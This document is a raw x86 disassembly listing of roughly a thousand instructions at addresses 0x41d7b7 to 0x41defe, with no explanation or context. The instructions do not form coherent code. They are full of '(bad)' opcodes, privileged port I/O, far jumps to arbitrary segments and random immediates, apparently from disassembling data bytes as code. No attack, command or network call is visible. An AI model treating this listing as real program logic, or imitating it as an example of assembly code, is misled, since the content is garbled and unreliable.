  41d7b7:	shl    DWORD PTR [eax+0x1e4d8ff],1
  41d7bd:	imul   edx,DWORD PTR [ebx],0xffffffe3
  41d7c0:	jns    0x41d7fd
  41d7c2:	test   al,0x3e
  41d7c4:	add    esi,DWORD PTR [eax+0x1dc24f4a]
  41d7ca:	lods   eax,DWORD PTR fs:[esi]
  41d7cc:	stos   DWORD PTR es:[edi],eax
  41d7cd:	sub    eax,0x192302a4
  41d7d2:	in     eax,dx
  41d7d3:	out    dx,eax
  41d7d4:	xchg   edx,eax
  41d7d5:	(bad)  
  41d7d6:	cmp    al,0x64
  41d7d8:	sbb    al,0x1e
  41d7da:	sub    eax,0x7fb2cb46
  41d7df:	or     DWORD PTR [ebx-0x2e],0xffffffeb
  41d7e3:	in     al,dx
  41d7e4:	pop    esi
  41d7e5:	mov    ecx,0x92fac6d2
  41d7ea:	xor    eax,DWORD PTR [edx+0x2c96a739]
  41d7f0:	jge    0x41d7be
  41d7f2:	test   eax,esp
  41d7f4:	and    DWORD PTR [ebx+0x55],eax
  41d7f7:	sbb    al,0xb7
  41d7f9:	test   al,0x91
  41d7fb:	inc    esp
  41d7fc:	lds    ebx,FWORD PTR [esi-0x8481440]
  41d802:	dec    esi
  41d803:	xor    BYTE PTR [ecx-0x59],bh
  41d806:	stos   DWORD PTR es:[edi],eax
  41d807:	stc    
  41d808:	sub    ch,BYTE PTR [eax]
  41d80a:	sub    eax,0x5cf4fbd8
  41d80f:	dec    ebx
  41d810:	or     dl,dl
  41d812:	xchg   edi,eax
  41d813:	call   0xf620097e
  41d818:	data16 jns 0x41d79d
  41d81b:	lods   eax,DWORD PTR ds:[esi]
  41d81c:	push   edx
  41d81d:	mov    ebx,0xd39abd9f
  41d822:	jno    0x41d872
  41d824:	fwait
  41d825:	xor    bh,0x2d
  41d828:	fadd   QWORD PTR [ebp-0x8]
  41d82b:	sbb    DWORD PTR [edi],edx
  41d82d:	mov    bl,BYTE PTR [edi-0x73]
  41d830:	in     eax,dx
  41d831:	push   cs
  41d832:	je     0x41d800
  41d834:	mov    WORD PTR [eax],?
  41d836:	(bad)  
  41d837:	stc    
  41d838:	inc    ebp
  41d839:	push   eax
  41d83a:	popa   
  41d83b:	jns    0x41d7d6
  41d83d:	pop    edx
  41d83e:	xchg   edx,eax
  41d83f:	mov    dl,0xca
  41d841:	adc    dl,BYTE PTR [eax-0x552b908e]
  41d847:	jge    0x41d8ba
  41d849:	and    eax,0x3f3d385c
  41d84e:	sub    BYTE PTR ds:0xfe1d3a84,ah
  41d854:	fld    DWORD PTR [ebx+0x69]
  41d857:	push   ebx
  41d858:	arpl   WORD PTR [eax],di
  41d85a:	adc    al,0xca
  41d85c:	and    eax,0x7544ca26
  41d861:	add    al,0x82
  41d863:	push   edi
  41d864:	in     al,dx
  41d865:	in     al,0x16
  41d867:	mov    edx,ebp
  41d869:	je     0x41d83a
  41d86b:	stos   DWORD PTR es:[edi],eax
  41d86c:	in     al,0x51
  41d86e:	fimul  DWORD PTR [ebp+edx*4-0x24]
  41d872:	shl    BYTE PTR [esi-0x5645ee53],cl
  41d878:	jg     0x41d7fe
  41d87a:	aas    
  41d87b:	aas    
  41d87c:	xchg   edi,eax
  41d87d:	(bad)  
  41d87e:	icebp  
  41d87f:	adc    esp,DWORD PTR [ebp-0x50]
  41d882:	xor    eax,0x54e38e48
  41d887:	jne    0x41d8e2
  41d889:	xchg   edx,eax
  41d88a:	and    ch,BYTE PTR [ebp+0x16687447]
  41d890:	out    0xb3,al
  41d892:	cmp    esp,edx
  41d894:	cld    
  41d895:	cdq    
  41d896:	hlt    
  41d897:	add    esi,edx
  41d899:	and    eax,0xeaa323a4
  41d89e:	(bad)  [esp+ebx*2+0x6e22243e]
  41d8a5:	test   BYTE PTR [esi-0x1],ch
  41d8a8:	sub    BYTE PTR [edx],0x3c
  41d8ab:	pop    ss
  41d8ac:	ins    BYTE PTR es:[edi],dx
  41d8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8ae:	fcmovnu st,st(2)
  41d8b0:	std    
  41d8b1:	(bad)  
  41d8b3:	ja     0x41d882
  41d8b5:	addr16 clc 
  41d8b7:	push   cs
  41d8b8:	cld    
  41d8b9:	mov    edx,0x155e43bc
  41d8be:	jp     0x41d8ec
  41d8c0:	jmp    0x6d5b7665
  41d8c5:	pop    ebp
  41d8c6:	xchg   edx,eax
  41d8c7:	and    al,0x1b
  41d8c9:	lahf   
  41d8ca:	jp     0x41d887
  41d8cc:	mov    dl,0x17
  41d8ce:	jg     0x41d8de
  41d8d0:	sbb    BYTE PTR [eax+0x4d],ch
  41d8d3:	xchg   ecx,eax
  41d8d4:	mov    ds:0xf710eb8d,eax
  41d8d9:	jge    0x41d885
  41d8db:	sub    eax,0x21e1baf7
  41d8e0:	xor    ah,BYTE PTR [eax]
  41d8e2:	inc    esp
  41d8e3:	sub    esi,0x46
  41d8e6:	pop    ecx
  41d8e7:	out    dx,eax
  41d8e8:	lods   eax,DWORD PTR ds:[esi]
  41d8e9:	and    DWORD PTR [edx+0x7e2cdce7],esp
  41d8ef:	es pushf 
  41d8f1:	or     ebx,DWORD PTR [ebx-0x49]
  41d8f4:	loope  0x41d89c
  41d8f6:	fwait
  41d8f7:	mov    bh,0xe3
  41d8f9:	fdivr  DWORD PTR [ecx+0x49e87056]
  41d8ff:	lahf   
  41d900:	cmp    bl,BYTE PTR [ecx-0x20]
  41d903:	out    0x10,eax
  41d905:	mov    DWORD PTR [esi+eax*2-0x65123d9b],ebp
  41d90c:	loope  0x41d944
  41d90e:	sbb    eax,0x2d7e360c
  41d913:	cmp    DWORD PTR [esi+0x1999c773],edx
  41d919:	mov    ebp,fs
  41d91b:	cmp    bh,BYTE PTR [ebx-0x25]
  41d91e:	jae    0x41d8ad
  41d920:	shr    BYTE PTR [edx],0x1a
  41d923:	loope  0x41d99b
  41d925:	and    cl,BYTE PTR [ecx+eiz*8-0x214676be]
  41d92c:	mov    esp,0x5b95e506
  41d931:	cmp    dl,BYTE PTR [eax]
  41d933:	adc    al,0x74
  41d935:	mov    esi,0x9773f83e
  41d93a:	out    0xfc,eax
  41d93c:	in     eax,dx
  41d93d:	stos   BYTE PTR es:[edi],al
  41d93e:	or     BYTE PTR [eax],cl
  41d940:	mov    DWORD PTR [eax],esp
  41d942:	lds    ebx,FWORD PTR [ecx+0xb]
  41d945:	mov    eax,ds:0x431bfa62
  41d94a:	pop    ss
  41d94b:	dec    ebx
  41d94c:	clc    
  41d94d:	and    bh,BYTE PTR [esi+0x36]
  41d950:	(bad)  
  41d951:	or     dh,BYTE PTR ds:0xec5dfaa4
  41d957:	add    al,0xb3
  41d959:	inc    ebx
  41d95a:	jecxz  0x41d9bf
  41d95c:	mov    ebp,edx
  41d95e:	iret   
  41d95f:	mov    al,ds:0x8fb3db17
  41d964:	mov    ch,0xb7
  41d966:	test   DWORD PTR [ebx-0x7082aae7],ebp
  41d96c:	mov    WORD PTR [ebx+0x77],ss
  41d96f:	(bad)  
  41d970:	mov    dl,0xf9
  41d972:	and    DWORD PTR [edx+eax*4],edi
  41d975:	or     DWORD PTR [edx-0x2c],esi
  41d978:	cmp    DWORD PTR [esi+ebp*1+0x5bf155fe],edx
  41d97f:	pop    ebx
  41d980:	jl     0x41d955
  41d982:	mov    ebp,0x39ede67c
  41d987:	add    ah,BYTE PTR [ecx]
  41d989:	pop    esi
  41d98a:	mov    ds:0x95222481,eax
  41d98f:	push   0x736bdbec
  41d994:	mov    ah,0x61
  41d996:	xchg   esi,eax
  41d997:	and    BYTE PTR [esi-0x14a80745],dl
  41d99d:	loop   0x41d928
  41d99f:	sbb    eax,0x3ef11779
  41d9a4:	jmp    0x6c42004b
  41d9a9:	inc    edi
  41d9aa:	sahf   
  41d9ab:	fcmovne st,st(2)
  41d9ad:	xchg   BYTE PTR [ebx+0x1f0b2f87],ch
  41d9b3:	aas    
  41d9b4:	push   esp
  41d9b5:	mov    ds:0x5f083fee,al
  41d9ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bb:	inc    edx
  41d9bc:	mov    bh,0x9f
  41d9be:	ror    DWORD PTR [edi+0x11],1
  41d9c1:	mov    esi,0x167da1b4
  41d9c6:	xchg   ebp,eax
  41d9c7:	mov    edi,ss
  41d9c9:	gs loope 0x41d9a8
  41d9cc:	sub    edi,esp
  41d9ce:	push   cs
  41d9cf:	loop   0x41da22
  41d9d1:	xor    ebx,DWORD PTR [esi+0x69]
  41d9d4:	mov    ds:0xead7a3be,al
  41d9d9:	add    dl,0x1f
  41d9dc:	ds test eax,0xa7ae47df
  41d9e2:	sbb    al,BYTE PTR [edx]
  41d9e4:	fwait
  41d9e5:	pop    esp
  41d9e6:	mov    eax,0xffde5f83
  41d9eb:	mov    DWORD PTR ds:0xe6d7a4f9,eax
  41d9f1:	add    dh,BYTE PTR [ebp+0x42]
  41d9f4:	and    DWORD PTR [esi],eax
  41d9f6:	mov    cl,0x33
  41d9f8:	icebp  
  41d9f9:	push   esi
  41d9fa:	inc    esi
  41d9fb:	int    0xf2
  41d9fd:	lea    ebp,[edx-0x4639dab8]
  41da03:	mov    bl,BYTE PTR [ebx-0x644b5438]
  41da09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da0a:	add    edi,DWORD PTR [edi-0x1b]
  41da0d:	stos   BYTE PTR es:[edi],al
  41da0e:	popf   
  41da0f:	xchg   edx,eax
  41da10:	imul   BYTE PTR [ebp+ebx*8-0x52]
  41da14:	loope  0x41da70
  41da16:	sub    al,0xf7
  41da18:	popa   
  41da19:	(bad)  [edx+0x27]
  41da1c:	jmp    DWORD PTR [ebp+0x1712e295]
  41da22:	sub    ecx,esp
  41da24:	pop    esp
  41da25:	jg     0x41da18
  41da27:	xor    eax,0x797d40b0
  41da2c:	and    eax,0x48628d21
  41da31:	repnz pop edi
  41da33:	xchg   esp,eax
  41da34:	cld    
  41da35:	cs push eax
  41da37:	out    dx,eax
  41da38:	add    dh,cl
  41da3a:	std    
  41da3b:	jg     0x41d9c4
  41da3d:	outs   dx,BYTE PTR ds:[esi]
  41da3e:	push   esp
  41da3f:	imul   edx,DWORD PTR [edi],0xffffff8f
  41da42:	(bad)  
  41da45:	jp     0x41da16
  41da47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da48:	xchg   esp,eax
  41da49:	test   BYTE PTR [eax+0x2348fbc4],ah
  41da4f:	test   DWORD PTR [eax+0x44],esp
  41da52:	ss pop eax
  41da54:	cmp    eax,0x6dc83066
  41da59:	xchg   edi,eax
  41da5a:	fist   DWORD PTR [edx-0x6395f040]
  41da60:	cmp    eax,0x6293a42b
  41da65:	sar    DWORD PTR [esi+ecx*1+0x14],cl
  41da69:	jmp    0x41da76
  41da6b:	das    
  41da6c:	icebp  
  41da6d:	jb     0x41da80
  41da6f:	pop    ebp
  41da70:	sub    DWORD PTR [esi+0x649d4ced],ebp
  41da76:	das    
  41da77:	push   0xa71c6789
  41da7c:	sbb    al,0x59
  41da7e:	dec    edi
  41da7f:	or     ebp,DWORD PTR [ecx+0x21689f60]
  41da85:	pop    esp
  41da86:	cmp    DWORD PTR [esi+ebp*1+0x25746a04],esp
  41da8d:	call   0xf3227f39
  41da92:	ss pop ds
  41da94:	fisub  DWORD PTR [ecx]
  41da96:	jmp    0x41da24
  41da98:	push   ss
  41da99:	adc    DWORD PTR [edi-0x45],esp
  41da9c:	(bad)  
  41da9e:	xchg   edx,eax
  41da9f:	icebp  
  41daa0:	call   0xda6b:0x40ece60e
  41daa7:	and    ch,bh
  41daa9:	loope  0x41dafd
  41daab:	fimul  DWORD PTR [esi]
  41daad:	add    DWORD PTR [esi+0x5a],0x5d3bb739
  41dab4:	test   eax,0xdde77891
  41dab9:	out    0xc5,eax
  41dabb:	jnp    0x41db2d
  41dabd:	je     0x41dad4
  41dabf:	retf   
  41dac0:	fild   DWORD PTR [ebx+esi*4]
  41dac3:	es push 0xffffff8f
  41dac6:	cmp    ebp,DWORD PTR [ebx+0x6]
  41dac9:	xchg   BYTE PTR [edx-0x40586d7e],bl
  41dacf:	retf   
  41dad0:	lea    edi,[ebp+0x645e1e5c]
  41dad6:	mov    eax,0xb264a547
  41dadb:	enter  0x26a6,0xed
  41dadf:	inc    esi
  41dae0:	lods   al,BYTE PTR ds:[esi]
  41dae1:	mov    fs,WORD PTR [edx-0x5ac37c2e]
  41dae7:	cmp    esi,DWORD PTR [eax]
  41dae9:	mov    ss,WORD PTR [ebx]
  41daeb:	lahf   
  41daec:	xchg   DWORD PTR [eax],edx
  41daee:	sbb    edi,ecx
  41daf0:	sti    
  41daf1:	sbb    DWORD PTR [eax],ecx
  41daf3:	ss inc edi
  41daf5:	add    al,0x25
  41daf7:	xchg   esp,eax
  41daf8:	and    al,0xfc
  41dafa:	test   al,0x6d
  41dafc:	ins    DWORD PTR es:[edi],dx
  41dafd:	jns    0x41dafc
  41daff:	div    BYTE PTR [esi+eax*2-0x43100da3]
  41db06:	mov    BYTE PTR ds:0x5f02afa7,al
  41db0c:	mov    esi,0x7e51ae3c
  41db11:	xor    BYTE PTR [edx-0xfc9f59],al
  41db17:	(bad)  [ebp+0x72]
  41db1a:	js     0x41db08
  41db1c:	and    DWORD PTR [edi-0xc415ddb],ebp
  41db22:	jl     0x41dadd
  41db24:	pop    es
  41db25:	test   ebx,esi
  41db27:	nop
  41db28:	(bad)  
  41db29:	int3   
  41db2a:	jns    0x41dabd
  41db2c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41db2e:	arpl   si,di
  41db30:	jl     0x41dabe
  41db32:	xchg   ecx,eax
  41db33:	rcr    BYTE PTR [edx],1
  41db35:	mov    bh,0x57
  41db37:	in     al,dx
  41db38:	push   eax
  41db39:	mov    esp,0x143c1ecf
  41db3e:	jnp    0x41dbb7
  41db40:	sbb    bh,BYTE PTR [esi]
  41db42:	dec    esi
  41db43:	xchg   esi,eax
  41db44:	ins    BYTE PTR es:[edi],dx
  41db45:	test   BYTE PTR [edx+0x7d5693e9],bl
  41db4b:	mov    edi,0x3ead38
  41db50:	inc    edi
  41db51:	pop    ss
  41db52:	les    ebx,FWORD PTR [esi]
  41db54:	jmp    0xb667b73
  41db59:	pusha  
  41db5a:	dec    ecx
  41db5b:	ins    DWORD PTR es:[edi],dx
  41db5c:	fld    st(5)
  41db5e:	dec    edx
  41db5f:	push   ecx
  41db60:	sti    
  41db61:	push   es
  41db62:	sbb    eax,0xe7b63c75
  41db67:	push   ecx
  41db68:	in     eax,0x37
  41db6a:	sar    BYTE PTR [ebp+0x61],cl
  41db6d:	inc    esi
  41db6e:	pop    es
  41db6f:	jo     0x41db34
  41db71:	iret   
  41db72:	xchg   ebp,eax
  41db73:	stc    
  41db74:	ret    0xef47
  41db77:	fsubr  DWORD PTR [eax-0x7f]
  41db7a:	sbb    BYTE PTR [ecx+0x30194f5d],ah
  41db80:	fst    QWORD PTR [ecx-0x6e0f5605]
  41db86:	(bad)  
  41db88:	std    
  41db89:	cmp    al,0x67
  41db8b:	xchg   esi,eax
  41db8c:	pop    ecx
  41db8d:	bound  esi,QWORD PTR [edi]
  41db8f:	mov    BYTE PTR es:[esp+esi*2],al
  41db93:	push   esp
  41db94:	bound  esi,QWORD PTR [edx+0x61]
  41db97:	mov    eax,ds:0x49e29378
  41db9c:	or     al,0xa9
  41db9e:	or     eax,0x95725e66
  41dba3:	push   ebp
  41dba4:	cmp    cl,bh
  41dba6:	test   al,0x60
  41dba8:	(bad)  
  41dbaa:	inc    ebx
  41dbab:	xchg   DWORD PTR [ecx+0xd],ecx
  41dbae:	xchg   DWORD PTR [ecx+0x4c43f3f8],edi
  41dbb4:	pop    eax
  41dbb5:	push   es
  41dbb6:	jns    0x41db3e
  41dbb8:	dec    edx
  41dbb9:	jbe    0x41dc32
  41dbbb:	sub    bl,BYTE PTR [ecx-0x4860a45e]
  41dbc1:	jge    0x41dbc2
  41dbc3:	sbb    eax,0xd4853156
  41dbc8:	data16 sub BYTE PTR [edi],ch
  41dbcb:	inc    edx
  41dbcc:	xchg   ebp,eax
  41dbcd:	cmc    
  41dbce:	sub    DWORD PTR [edx-0x29652041],ebx
  41dbd4:	or     eax,DWORD PTR [eax]
  41dbd6:	je     0x41dbb8
  41dbd8:	jmp    0x12c7:0x93102f27
  41dbdf:	retf   0x5433
  41dbe2:	shr    esp,cl
  41dbe4:	repz pop esi
  41dbe6:	test   dh,0xa1
  41dbe9:	sahf   
  41dbea:	xchg   esi,eax
  41dbeb:	pop    ss
  41dbec:	inc    esp
  41dbed:	(bad)  
  41dbee:	xchg   ebx,eax
  41dbef:	icebp  
  41dbf0:	dec    edx
  41dbf1:	clc    
  41dbf2:	xor    al,0xdd
  41dbf4:	dec    esp
  41dbf5:	inc    DWORD PTR [edx]
  41dbf7:	mov    ebx,0xc54128ca
  41dbfc:	pop    ds
  41dbfd:	sub    bl,BYTE PTR [ebp+ebx*1-0x76]
  41dc01:	push   edi
  41dc02:	leave  
  41dc03:	jno    0x41dbef
  41dc05:	push   cs
  41dc06:	jl     0x41dbc5
  41dc08:	jne    0x41dc4b
  41dc0a:	adc    al,dh
  41dc0c:	dec    ebp
  41dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc0e:	ret    0xc240
  41dc11:	sbb    al,0x91
  41dc13:	stc    
  41dc14:	inc    edi
  41dc15:	idiv   DWORD PTR [ecx+0x63]
  41dc18:	adc    eax,0x9756c899
  41dc1d:	scas   al,BYTE PTR es:[edi]
  41dc1e:	or     ch,BYTE PTR [ebx+0x76]
  41dc21:	mov    ebx,0xaa18b6d5
  41dc26:	stos   DWORD PTR es:[edi],eax
  41dc27:	retf   
  41dc28:	pop    ecx
  41dc29:	mov    cl,0x2f
  41dc2b:	ret    0x1f93
  41dc2e:	dec    ebx
  41dc2f:	push   edi
  41dc30:	cld    
  41dc31:	mov    edx,0x682b22cd
  41dc36:	mov    ds:0xd407f29c,eax
  41dc3b:	dec    eax
  41dc3c:	retf   
  41dc3d:	mov    al,0x6a
  41dc3f:	jo     0x41dcbd
  41dc41:	bnd jbe 0x41dbe8
  41dc44:	and    eax,0x9dfe52ae
  41dc49:	add    ecx,DWORD PTR [edi]
  41dc4b:	sub    DWORD PTR [edi-0x6],esp
  41dc4e:	mov    eax,0x670e5987
  41dc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc54:	ret    0xadcf
  41dc57:	test   al,0xb4
  41dc59:	addr16 lock jp 0x41dc8c
  41dc5d:	inc    esi
  41dc5e:	int    0x73
  41dc60:	retf   0x9c28
  41dc63:	inc    edi
  41dc64:	mov    ecx,0xf2e54fbc
  41dc69:	pop    esp
  41dc6a:	(bad)  
  41dc6b:	repnz cdq 
  41dc6d:	sub    BYTE PTR [edx-0x7c6117f7],0x2a
  41dc74:	dec    ecx
  41dc75:	xchg   ebp,eax
  41dc76:	lahf   
  41dc77:	mov    bl,0x73
  41dc79:	cmc    
  41dc7a:	pop    ecx
  41dc7b:	push   ebp
  41dc7c:	test   DWORD PTR [esi],edx
  41dc7e:	arpl   WORD PTR [ebx-0x16],di
  41dc81:	stos   DWORD PTR es:[edi],eax
  41dc82:	xchg   edi,eax
  41dc83:	test   al,0xce
  41dc85:	xor    eax,0xd51835e6
  41dc8a:	lea    dx,[eax-0x6eef74c9]
  41dc91:	loopne 0x41dc8e
  41dc93:	fsub   st,st(1)
  41dc95:	loopne 0x41dc97
  41dc97:	test   eax,0x850e849f
  41dc9c:	cld    
  41dc9d:	inc    eax
  41dc9e:	ins    DWORD PTR es:[edi],dx
  41dc9f:	cdq    
  41dca0:	add    bh,BYTE PTR [eax-0x3402b0e7]
  41dca6:	lods   al,BYTE PTR ds:[esi]
  41dca7:	mov    al,0xff
  41dca9:	xchg   DWORD PTR [edx+0x12],edi
  41dcac:	cmp    DWORD PTR [eax+edx*8+0x44],edi
  41dcb0:	es pop edx
  41dcb2:	mov    al,0x66
  41dcb4:	xchg   DWORD PTR [ebx-0x3573ff39],edx
  41dcba:	aam    0x74
  41dcbc:	scas   eax,DWORD PTR es:[edi]
  41dcbd:	pop    ecx
  41dcbe:	jnp    0x41dce4
  41dcc0:	add    al,0x82
  41dcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcc3:	inc    esi
  41dcc4:	icebp  
  41dcc5:	pop    ds
  41dcc6:	mov    ds:0x841e62e4,eax
  41dccb:	test   eax,0x8a24bd89
  41dcd0:	rcl    DWORD PTR [ecx],0xe
  41dcd3:	xor    cl,bl
  41dcd5:	mul    bh
  41dcd7:	add    ch,BYTE PTR [edi+0x16]
  41dcda:	adc    ah,ch
  41dcdc:	out    dx,al
  41dcdd:	dec    esp
  41dcde:	adc    DWORD PTR [ecx],ecx
  41dce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce1:	js     0x41dc9e
  41dce3:	fst    st(1)
  41dce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce6:	push   edi
  41dce7:	jo     0x41dd34
  41dce9:	retf   
  41dcea:	sbb    eax,0x947ef2a3
  41dcef:	pop    ebx
  41dcf0:	lods   eax,DWORD PTR ds:[esi]
  41dcf1:	popa   
  41dcf2:	shr    BYTE PTR [edi+0xfbddf65],0x27
  41dcf9:	lods   eax,DWORD PTR ds:[esi]
  41dcfa:	out    dx,al
  41dcfb:	mov    cl,0x66
  41dcfd:	push   0x677c8e9a
  41dd02:	push   ds
  41dd03:	mov    al,0x34
  41dd05:	sbb    BYTE PTR [esi+0x11bd9ed5],al
  41dd0b:	je     0x41dd1f
  41dd0d:	jno    0x41dd38
  41dd0f:	aas    
  41dd10:	or     dl,BYTE PTR [edi-0x15997601]
  41dd16:	(bad)  
  41dd17:	mov    WORD PTR ds:0x2fd02ce5,gs
  41dd1d:	ret    
  41dd1e:	popa   
  41dd1f:	int3   
  41dd20:	dec    esi
  41dd21:	and    al,0x2a
  41dd23:	inc    esi
  41dd24:	data16 jae 0x41dcab
  41dd27:	jmp    0x8b13:0x9180255e
  41dd2e:	inc    ebp
  41dd2f:	mov    BYTE PTR [edi+0x43],ah
  41dd32:	mov    BYTE PTR [ebx+0x74],bh
  41dd35:	xchg   BYTE PTR [ebx+0x5e67c309],al
  41dd3b:	mov    DWORD PTR [esi],edx
  41dd3d:	out    0xa3,al
  41dd3f:	test   BYTE PTR [edx-0x2c],bl
  41dd42:	mov    al,ds:0xf905956c
  41dd47:	push   ebp
  41dd48:	dec    esi
  41dd49:	fcom   QWORD PTR [edi]
  41dd4b:	pop    ebx
  41dd4c:	fimul  WORD PTR [eax+ebx*4]
  41dd4f:	repz iret 
  41dd51:	mov    al,ds:0xa9800015
  41dd56:	jecxz  0x41dd11
  41dd58:	xor    ah,bh
  41dd5a:	mov    dh,0xf3
  41dd5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd5d:	aaa    
  41dd5e:	test   DWORD PTR [ebx],0x2fa461d5
  41dd64:	adc    eax,0xe01c260
  41dd69:	lds    esi,FWORD PTR [ebx]
  41dd6b:	push   es
  41dd6c:	push   esp
  41dd6d:	sar    BYTE PTR [edi],cl
  41dd6f:	or     ecx,eax
  41dd71:	sub    al,0xc5
  41dd73:	add    al,0xba
  41dd75:	xor    al,0xd7
  41dd77:	xor    ecx,esp
  41dd79:	and    ebx,DWORD PTR [edx-0x75018419]
  41dd7f:	push   ebx
  41dd80:	push   ebx
  41dd81:	fs aam 0x7f
  41dd84:	or     cl,BYTE PTR [ebx+eiz*4]
  41dd87:	leave  
  41dd88:	xor    bh,BYTE PTR [edx]
  41dd8a:	lea    edi,[eax+ecx*1]
  41dd8d:	hlt    
  41dd8e:	mov    dh,dl
  41dd90:	cmp    eax,0x82b594b2
  41dd95:	jmp    0x41dd27
  41dd97:	sti    
  41dd98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd99:	and    eax,0xcc6884bf
  41dd9e:	sub    BYTE PTR [ebx-0x39a0f48d],ah
  41dda4:	fidiv  WORD PTR [ebp+0x14ac0ee]
  41ddaa:	sti    
  41ddab:	arpl   WORD PTR [ebx-0x54b01915],dx
  41ddb1:	jecxz  0x41ddd8
  41ddb3:	fdivr  st,st(3)
  41ddb5:	push   cs
  41ddb6:	aas    
  41ddb7:	cld    
  41ddb8:	xchg   ecx,eax
  41ddb9:	jge    0x41dd73
  41ddbb:	popf   
  41ddbc:	dec    ebx
  41ddbd:	scas   eax,DWORD PTR es:[edi]
  41ddbe:	mov    esp,0x41a59ade
  41ddc3:	lods   al,BYTE PTR ds:[esi]
  41ddc4:	adc    al,0x10
  41ddc6:	dec    esp
  41ddc7:	jnp    0x41ddf5
  41ddc9:	adc    esi,DWORD PTR [edx]
  41ddcb:	daa    
  41ddcc:	adc    bl,BYTE PTR [edx]
  41ddce:	jmp    0x41dd84
  41ddd0:	jno    0x41ddc8
  41ddd2:	xchg   esi,eax
  41ddd3:	sub    al,0xae
  41ddd5:	sbb    BYTE PTR [edx+0x6a],cl
  41ddd8:	lods   al,BYTE PTR ds:[esi]
  41ddd9:	xchg   ebx,eax
  41ddda:	sub    BYTE PTR [ebx+esi*8-0x52],dl
  41ddde:	pop    edx
  41dddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde0:	dec    ebp
  41dde1:	ins    DWORD PTR es:[edi],dx
  41dde2:	pop    ss
  41dde3:	out    dx,eax
  41dde4:	sti    
  41dde5:	mov    ds:0x4ea13533,al
  41ddea:	in     al,0x92
  41ddec:	loopne 0x41de1b
  41ddee:	jg     0x41ddaf
  41ddf0:	(bad)
  41ddf4:	and    al,BYTE PTR [edi-0x1c]
  41ddf7:	adc    eax,edi
  41ddf9:	cli    
  41ddfa:	stc    
  41ddfb:	cwde   
  41ddfc:	sub    BYTE PTR ds:[ebx],ch
  41ddff:	mov    ds:0x1ff093c7,eax
  41de04:	and    al,al
  41de06:	popa   
  41de07:	in     eax,0x45
  41de09:	loope  0x41de2b
  41de0b:	or     dh,BYTE PTR [edx+0x46cf3db9]
  41de11:	cs inc ecx
  41de13:	into   
  41de14:	mov    al,0x93
  41de16:	xor    ebp,ebx
  41de18:	add    BYTE PTR [eax-0x3e],al
  41de1b:	sub    cl,BYTE PTR [edx]
  41de1d:	jmp    0x1b06:0xb45224e5
  41de24:	inc    ebp
  41de25:	ss es icebp 
  41de28:	sbb    eax,ecx
  41de2a:	inc    esi
  41de2b:	cdq    
  41de2c:	add    dh,BYTE PTR [ecx]
  41de2e:	shl    eax,cl
  41de30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de31:	pop    ss
  41de32:	mov    ecx,0xc53db036
  41de37:	xlat   BYTE PTR ds:[ebx]
  41de38:	(bad)  
  41de39:	ins    BYTE PTR es:[edi],dx
  41de3a:	pop    esp
  41de3b:	aam    0x36
  41de3d:	add    eax,0xbf7e5620
  41de42:	call   0x95afd504
  41de47:	addr16 mov bl,0x8c
  41de4a:	pop    eax
  41de4b:	jl     0x41de3e
  41de4d:	mov    ebp,0xa594b2a1
  41de52:	aam    0x2
  41de54:	push   esi
  41de55:	jl     0x41de8e
  41de57:	adc    al,BYTE PTR [ebx+0x69]
  41de5a:	add    BYTE PTR [edi-0x3e339dc6],dl
  41de60:	dec    edx
  41de61:	or     eax,0xca2230ee
  41de66:	das    
  41de67:	lahf   
  41de68:	(bad)  
  41de69:	das    
  41de6a:	adc    al,0xd5
  41de6c:	dec    edi
  41de6d:	call   0xa510:0xcd48a68e
  41de74:	shl    DWORD PTR [ebx-0x12],0xfc
  41de78:	loope  0x41de62
  41de7a:	fsub   DWORD PTR [edi-0x4905a6c]
  41de80:	int3   
  41de81:	xchg   ecx,eax
  41de82:	xor    DWORD PTR [ebx+0x517dd8f7],ecx
  41de88:	scas   eax,DWORD PTR es:[edi]
  41de89:	push   edi
  41de8a:	ss leave 
  41de8c:	and    ch,BYTE PTR [esi+0x3a7d2985]
  41de92:	in     eax,dx
  41de93:	add    ch,BYTE PTR [ebp*2-0x4d5c4d3]
  41de9a:	fs push ecx
  41de9c:	fs cli 
  41de9e:	sbb    al,0x0
  41dea0:	jmp    0x41de9f
  41dea2:	and    BYTE PTR [ecx-0x35],dl
  41dea5:	pop    eax
  41dea6:	addr16 loope 0x41dea1
  41dea9:	loopne 0x41de99
  41deab:	push   ss
  41deac:	xchg   ebx,eax
  41dead:	mov    ecx,0x6166deec
  41deb2:	repnz or BYTE PTR ds:0x744cc033,ch
  41deb9:	fistp  WORD PTR [ecx-0x24]
  41debc:	sbb    al,0x5d
  41debe:	mov    bl,0x12
  41dec0:	cmp    al,BYTE PTR [esi]
  41dec2:	int3   
  41dec3:	inc    ecx
  41dec4:	pop    esp
  41dec5:	mov    esp,DWORD PTR [ebp+0x76]
  41dec8:	je     0x41dedb
  41deca:	xchg   BYTE PTR [esi-0x6cb9d04f],ch
  41ded0:	(bad)  
  41ded1:	sbb    edx,DWORD PTR [esi]
  41ded3:	xor    BYTE PTR [edi-0x624a6185],dh
  41ded9:	dec    edx
  41deda:	shl    BYTE PTR [eax+0x3fad8122],cl
  41dee0:	add    al,0xb2
  41dee2:	fnsave [ebp-0x20d6acc0]
  41dee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee9:	test   al,0x98
  41deeb:	test   al,0xde
  41deed:	mov    bh,0xb8
  41deef:	repnz int 0x2d
  41def2:	dec    ebx
  41def3:	arpl   bp,cx
  41def5:	dec    ebx
  41def6:	stos   DWORD PTR es:[edi],eax
  41def7:	xor    bl,al
  41def9:	push   esi
  41defa:	mov    al,0x7b
  41defc:	or     BYTE PTR [edi],cl
  41defe:	jmp    0x41df1b
